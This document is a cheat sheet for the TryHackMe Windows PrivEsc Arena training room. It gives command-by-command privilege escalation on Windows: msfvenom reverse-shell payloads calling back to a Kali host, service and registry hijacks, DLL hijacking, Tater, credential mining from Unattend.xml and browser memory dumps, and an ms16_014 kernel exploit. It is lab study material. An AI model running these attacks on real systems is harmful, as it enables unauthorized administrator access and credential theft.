# THM Windows PrivEsc Arena Cheat Sheet
Based on the TryHackMe **Windows PrivEsc Arena** walkthrough flow

Room basics:

- RDP is exposed on port `3389`
- Low-priv user: `user:password321`
- Admin creds used in some tasks: `TCM:Hacker123`

---

# 0. Connect and Baseline

## Connect from Kali

```bash
xfreerdp /u:user /p:password321 /cert:ignore /v:TARGET_IP
```

## Confirm users on the box

```cmd
net user
```

## Useful tool paths on the target

```text
C:\Users\User\Desktop\Tools\
C:\Users\User\Desktop\Tools\Accesschk\
C:\Users\User\Desktop\Tools\Autoruns\
C:\Users\User\Desktop\Tools\Procmon\
C:\Users\User\Desktop\Tools\Source\
C:\Users\User\Desktop\Tools\Tater\
```

---

# 1. Registry Escalation - Autorun

## Detection (Windows VM)

```cmd
C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
```

In Autoruns:

1. Open the **Logon** tab
2. Find **My Program**
3. Note the target executable:

```text
C:\Program Files\Autorun Program\program.exe
```

Check write permissions:

```cmd
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
```

## Exploitation (Kali)

Start a listener:

```bash
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST KALI_IP
run
```

Generate payload:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=KALI_IP -f exe -o program.exe
```

Transfer `program.exe` to the target.

## Trigger (Windows VM)

Replace the original binary:

```cmd
copy /y C:\Temp\program.exe "C:\Program Files\Autorun Program\program.exe"
```

Log off, then log in as an administrator user to trigger autorun.

## Verify (Kali)

```text
sessions -i SESSION_ID
getuid
```

---

# 2. Registry Escalation - AlwaysInstallElevated

## Detection (Windows VM)

```cmd
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
```

You want both to show:

```text
AlwaysInstallElevated    REG_DWORD    0x1
```

## Exploitation (Kali)

Start a listener:

```bash
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST KALI_IP
run
```

Generate MSI payload:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=KALI_IP LPORT=<port> -f msi -o setup.msi
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=<port> -f msi > setup.msi
```

Transfer `setup.msi` to the target.

## Trigger (Windows VM)

```cmd
mkdir C:\Temp
copy setup.msi C:\Temp\setup.msi
msiexec /quiet /qn /i C:\Temp\setup.msi
```

---

# 3. Service Escalation - Registry Permissions

The fundamental privilege escalation mechanism here is based on abusing weak permissions on a Windows service’s registry configuration. Because the service’s registry key (HKLM\SYSTEM\CurrentControlSet\Services\regsvc) grants a low-privileged user (via NT AUTHORITY\INTERACTIVE) full control, the attacker can modify the ImagePath value, which determines what executable the service runs. Since Windows services typically execute with high privileges (often as SYSTEM), changing this path to a malicious executable allows the attacker to make the service run arbitrary code with elevated privileges. When the service is started, it executes the attacker-controlled binary as SYSTEM, enabling actions such as adding the user to the Administrators group, thereby achieving privilege escalation.

## Detection (Windows VM, PowerShell)

```powershell
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
```

Look for a low-priv principal with dangerous rights such as `FullControl`.

## Build malicious service binary (Windows -> Kali)

Copy the source file to Kali:

```cmd
copy C:\Users\User\Desktop\Tools\Source\windows_service.c C:\Temp\windows_service.c
```

Serve or transfer it to Kali.

Edit the `system()` call inside `windows_service.c` to:

```c
cmd.exe /k net localgroup administrators user /add
```

Compile on Kali:

```bash
x86_64-w64-mingw32-gcc windows_service.c -o x.exe
```

If needed:

```bash
sudo apt install gcc-mingw-w64
```

Serve the payload:

```bash
python3 -m http.server 81
```

## Exploitation (Windows VM)

Download or copy `x.exe` to the target:

```cmd
mkdir C:\Temp
copy x.exe C:\Temp\x.exe
```

Change the service image path in the registry:

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\Temp\x.exe /f
```

Start the service:

```cmd
sc start regsvc
```

Verify:

```cmd
net localgroup administrators
```

---

# 4. Service Escalation - Executable File Permissions

The fundamental privilege escalation mechanism here relies on weak file permissions on a Windows service executable. Because the service binary (filepermservice.exe) is writable by low-privileged users (due to Everyone having FILE_ALL_ACCESS), an attacker can overwrite it with a malicious executable. Since Windows services typically run with elevated privileges such as SYSTEM, replacing the legitimate binary ensures that when the service is started, it executes the attacker-controlled code with those high privileges. This allows the attacker to perform privileged actions, such as adding their user to the Administrators group, and thereby achieving privilege escalation.

## Detection (Windows VM)

```cmd
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"
```

If `Everyone` has `FILE_ALL_ACCESS` over the service executable, replace it.

## Reuse the previously compiled payload

Use the `x.exe` from the previous step, or create another payload that adds the low-priv user to Administrators.

## Exploitation (Windows VM)

```cmd
copy /y C:\Temp\x.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
sc start filepermsvc
net localgroup administrators
```

---

# 5. Privilege Escalation - Startup Applications

## Detection (Windows VM)

```cmd
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

If `BUILTIN\Users` has `(F)` or write access, drop a payload there.

## Exploitation (Kali)

Start a listener:

```bash
msfconsole
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST KALI_IP
run
```

Generate payload:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=KALI_IP LPORT=4444 -f exe -o x.exe
```

Transfer `x.exe` to the target.

## Trigger (Windows VM)

```cmd
copy x.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\x.exe"
shutdown /l
```

Then log in with the administrator account:

```text
TCM / Hacker123
```

## Verify (Kali)

```text
getuid
```

---

# 6. Service Escalation - DLL Hijacking

## Detection (Windows VM)

Open Procmon as administrator:

```text
C:\Users\User\Desktop\Tools\Procmon\Procmon.exe
```

Apply filters:

1. `Process Name` `is` `dllhijackservice.exe` -> `Include`
2. `Result` `is` `NAME NOT FOUND` -> `Include`

Start the vulnerable service:

```cmd
sc start dllsvc
```

Look for a missing DLL load such as:

```text
C:\Temp\hijackme.dll
```

## Build malicious DLL (Windows -> Kali)

Copy source:

```cmd
copy C:\Users\User\Desktop\Tools\Source\windows_dll.c C:\Temp\windows_dll.c
```

Edit the `system()` call to:

```c
cmd.exe /k net localgroup administrators user /add
```

Compile on Kali:

```bash
x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll
```

Transfer `hijackme.dll` to the target.

## Exploitation (Windows VM)

```cmd
copy hijackme.dll C:\Temp\hijackme.dll
sc stop dllsvc
sc start dllsvc
net localgroup administrators
```

---

# 7. Service Escalation - binPath

## Detection (Windows VM)

```cmd
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc
```

If the current user has `SERVICE_CHANGE_CONFIG`, change the service command.

## Exploitation (Windows VM)

```cmd
sc config daclsvc binpath= "net localgroup administrators user /add"
sc start daclsvc
net localgroup administrators
```

---

# 8. Service Escalation - Unquoted Service Paths

## Detection (Windows VM)

```cmd
sc qc unquotedsvc
```

Look for an unquoted path such as:

```text
C:\Program Files\Unquoted Path Service\Common Files\some.exe
```

Windows may try to execute:

```text
C:\Program.exe
C:\Program Files\Unquoted.exe
C:\Program Files\Unquoted Path.exe
C:\Program Files\Unquoted Path Service\Common.exe
```

In this room, the walkthrough places `common.exe` under:

```text
C:\Program Files\Unquoted Path Service\
```

## Exploitation (Kali)

Generate a service-style executable:

```bash
msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
```

Transfer `common.exe` to the target.

## Trigger (Windows VM)

```cmd
copy common.exe "C:\Program Files\Unquoted Path Service\common.exe"
sc start unquotedsvc
net localgroup administrators
```

---

# 9. Potato Escalation - Hot Potato / Tater

## Exploitation (Windows VM)

Open PowerShell with execution policy bypass:

```powershell
powershell.exe -nop -ep bypass
```

Import Tater:

```powershell
Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1
```

Run the privilege escalation command:

```powershell
Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
```

Verify:

```powershell
net localgroup administrators
```

---

# 10. Password Mining - Configuration Files

## Read unattended install file (Windows VM)

```cmd
notepad C:\Windows\Panther\Unattend.xml
```

Find the Base64-encoded password under the `<Password>` section, inside the `<Value>` tag.

## Decode on Kali

```bash
echo 'BASE64_VALUE_HERE' | base64 -d
```

Expected in the room:

```text
password123
```

---

# 11. Password Mining - Memory

## Start HTTP Basic Auth capture (Kali)

```bash
msfconsole
use auxiliary/server/capture/http_basic
set URIPATH x
run
```

## Trigger authentication prompt (Windows VM)

Browse to:

```text
http://KALI_IP/x
```

## Dump browser memory (Windows VM)

```cmd
taskmgr
```

In Task Manager:

1. Find `iexplore.exe`
2. Right-click it
3. Choose **Create Dump File**

Copy the generated `iexplore.DMP` to Kali.

## Extract credentials from dump (Kali)

```bash
strings /root/Desktop/iexplore.DMP | grep "Authorization: Basic"
```

Take the Base64 string and decode it:

```bash
echo -ne 'BASE64_STRING' | base64 -d
```

---

# 12. Kernel Exploits

## Establish initial shell (Kali)

Start listener:

```bash
msfconsole
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST KALI_IP
run
```

Generate payload:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=KALI_IP LPORT=4444 -f exe -o shell.exe
```

Serve it:

```bash
python3 -m http.server 81
```

## Execute on target (Windows VM)

```cmd
copy shell.exe C:\Temp\shell.exe
C:\Temp\shell.exe
```

## Suggest local exploits (Kali, inside meterpreter)

```text
run post/multi/recon/local_exploit_suggester
```

The walkthrough identifies:

```text
exploit/windows/local/ms16_014_wmi_recv_notif
```

## Run suggested exploit

```text
use exploit/windows/local/ms16_014_wmi_recv_notif
set SESSION SESSION_ID
set LHOST tun0
set LPORT 5555
run
```

---

# 13. Quick Reusable Commands

## Check service config

```cmd
sc qc SERVICE_NAME
```

## Start/stop service

```cmd
sc stop SERVICE_NAME
sc start SERVICE_NAME
```

## Check writable files/folders with AccessChk

```cmd
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Some\Path"
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc SERVICE_NAME
```

## Verify admin membership

```cmd
net localgroup administrators
```

## Check current privileges

```cmd
whoami /priv
whoami /groups
```

---

# 14. Minimal Exam-Style Decision Tree

## Services
```cmd
sc qc SERVICE_NAME
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc SERVICE_NAME
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Some Service"
```

## Startup and autoruns
```cmd
icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
```

## Registry
```cmd
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
powershell -c "Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl"
```

## Credentials
```cmd
notepad C:\Windows\Panther\Unattend.xml
cmdkey /list
```

## General validation
```cmd
net localgroup administrators
whoami
```
